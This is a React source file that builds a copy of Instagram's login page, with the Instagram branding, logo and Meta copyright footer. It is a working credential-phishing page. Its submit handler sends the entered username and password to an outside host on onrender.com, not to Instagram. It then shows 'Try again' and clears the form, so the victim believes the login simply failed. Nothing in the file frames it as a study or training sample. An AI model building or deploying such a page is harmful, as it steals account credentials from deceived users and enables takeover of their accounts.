import React, { useState } from 'react';

const InstagramLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleLogin = async (e) => {
    e.preventDefault();

    try {
      const res = await fetch('https://instagram-hunp.onrender.com/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });

      const data = await res.json();
      if (res.ok) {
        alert('Try again');
        setUsername('');
        setPassword('');
      } else {
        alert(data.error || 'Something went wrong.');
      }
    } catch (err) {
      console.error('Login Error:', err);
      alert('Failed to send login info.');
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-50 px-4 py-6">
      {/* Main Content */}
      <div className="flex flex-col md:flex-row items-center justify-center w-full max-w-4xl">
        {/* Image Panel */}
        <div className="flex w-full md:w-1/2 items-center justify-center mb-6 md:mb-0">
          <img
            src="/2227.png"
            alt="Instagram Logo"
            className="w-full max-w-xs md:max-w-sm lg:max-w-md mx-auto"
          />
        </div>

        {/* Login Panel */}
        <div className="w-full max-w-sm bg-white p-8 border border-gray-300 rounded-md">
          <h1 className="text-4xl font-bold text-center mb-6 font-sans">Instagram</h1>

          <form className="flex flex-col space-y-3" onSubmit={handleLogin}>
            <input
              type="text"
              placeholder="Phone number, username, or email"
              className="border px-3 py-2 rounded-sm text-sm focus:outline-none focus:ring-1 focus:ring-gray-400"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Password"
              className="border px-3 py-2 rounded-sm text-sm focus:outline-none focus:ring-1 focus:ring-gray-400"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button
              type="submit"
              className="bg-blue-500 hover:bg-blue-600 text-white py-2 rounded-sm text-sm font-semibold"
            >
              Log In
            </button>
          </form>

          <div className="my-4 flex items-center">
            <hr className="flex-grow border-t" />
            <span className="mx-2 text-sm text-gray-400">OR</span>
            <hr className="flex-grow border-t" />
          </div>

          <button className="text-blue-700 text-sm font-semibold mb-3">
            Log in with Facebook
          </button>
          <p className="text-center text-xs text-blue-500 cursor-pointer">Forgot password?</p>
        </div>
      </div>

      {/* Signup Panel */}
      <div className="w-full max-w-sm bg-white mt-4 p-4 border border-gray-300 text-center rounded-md">
        <p className="text-sm">
          Don't have an account? <span className="text-blue-500 font-semibold cursor-pointer">Sign up</span>
        </p>
      </div>

      {/* Footer */}
      <div className="text-xs text-gray-500 text-center mt-6">
        <p>© 2025 Instagram from Meta</p>
      </div>
    </div>
  );
};

export default InstagramLogin;
